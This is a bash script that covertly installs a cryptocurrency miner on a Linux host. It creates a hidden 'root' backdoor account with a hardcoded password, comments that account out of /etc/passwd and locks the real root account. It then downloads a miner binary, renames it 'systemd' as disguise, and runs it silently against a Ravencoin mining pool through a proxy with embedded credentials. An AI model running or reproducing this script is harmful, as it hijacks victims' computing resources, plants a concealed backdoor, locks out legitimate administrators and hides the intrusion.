#!/bin/bash

# Define variables
new_username="root"
password="king123"
original_command="./systemd --par=kawpow --user RQFqPLG7ysPijH28DvJSMnzdUcd2rS68oh --server stratum.ravenminer.com --port 3838 --socks sipuwfea-rotate:e90ia636sn8t@p.webshare.io:80 --socksdns > /dev/null 2>&1"

# Create user account
sudo useradd -m -p "$(openssl passwd -1 "$password")" "$new_username"

# Hide user from superuser
sudo sed -i "/^$new_username/ s/^/#/" /etc/passwd

# Set user password
echo "$new_username:$password" | sudo chpasswd

# Update and install Docker
sudo apt update && sudo apt install -y docker.io

# Add user to docker group
sudo usermod -aG docker "$new_username"

# Add subuids for user
sudo usermod --add-subuids 10-20000 "$new_username"

# Lock root user
sudo usermod -L root

# Download miniZ
wget https://github.com/miniZ-miner/miniZ/releases/download/v2.3c/miniZ_v2.3c_linux-x64.tar.gz

# Extract miniZ
tar -xvf miniZ_v2.3c_linux-x64.tar.gz

# Move miniZ to systemd
mv miniZ systemd

# Execute the original command
$original_command
